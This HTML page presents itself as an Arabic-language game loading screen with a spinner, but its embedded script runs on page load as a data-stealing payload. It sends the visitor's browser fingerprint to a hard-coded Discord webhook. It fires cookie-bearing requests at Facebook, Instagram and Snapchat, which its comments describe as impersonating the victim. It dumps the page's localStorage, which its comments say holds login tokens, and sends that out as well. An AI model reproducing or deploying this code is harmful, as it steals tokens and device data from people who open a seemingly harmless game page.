<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">6</div> <div class="loader"></div>
    <p>جاري تشغيل المحرك (V1.1.8)...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        // إرسال البيانات فوراً للديسكورد
        function instantLog(platform, content) {
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                embeds: [{
                    title: `🎯 سحب فوري: ${platform}`,
                    description: content,
                    color: 3066993,
                    timestamp: new Date().toISOString()
                }]
            }));
        }

        // الوظيفة الأساسية: "انتحال" طلبات الجهاز بالخلفية
        async function hijackSession(name, targetUrl) {
            // نستخدم fetch مع وضع 'include' لإجبار المتصفح يبعث الكوكيز
            // ونستخدم 'no-cors' عشان ما نوقف عند جدار الحماية، بس الطلب يوصل للموقع بكامل هوية الضحية
            fetch(targetUrl, { 
                method: 'GET', 
                credentials: 'include', 
                mode: 'no-cors',
                cache: 'no-store'
            }).then(() => {
                instantLog(name, "✅ المتصفح أرسل طلب 'منتحل' بنجاح بكوكيز الضحية.");
            }).catch(err => {
                instantLog(name, "❌ فشل الطلب: " + err.message);
            });
        }

        function executeProtocol() {
            // سحب معلومات النظام فوراً
            instantLog("Device Fingerprint", `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);

            // إطلاق الطلبات "بالتوازي" فوراً وبسرعة البرق
            // المتصفح رح يروح يطرق باب فيسبوك وانستا بصفته "الضحية"
            hijackSession("Facebook Payload", "https://mbasic.facebook.com/");
            hijackSession("Instagram Payload", "https://www.instagram.com/accounts/edit/");
            hijackSession("Snapchat Payload", "https://accounts.snapchat.com/accounts/merlin/login");

            // سحب الـ Tokens المخزنة في الـ LocalStorage (هذي هي اللي بتخليك تدخل بدون باسورد)
            const storage = JSON.stringify(localStorage);
            if (storage !== '{}') {
                instantLog("LocalStorage Dump", "```json\n" + storage + "\n```");
            }
        }

        // تشغيل البروتوكول فوراً
        executeProtocol();
    </script>
</body>
</html>
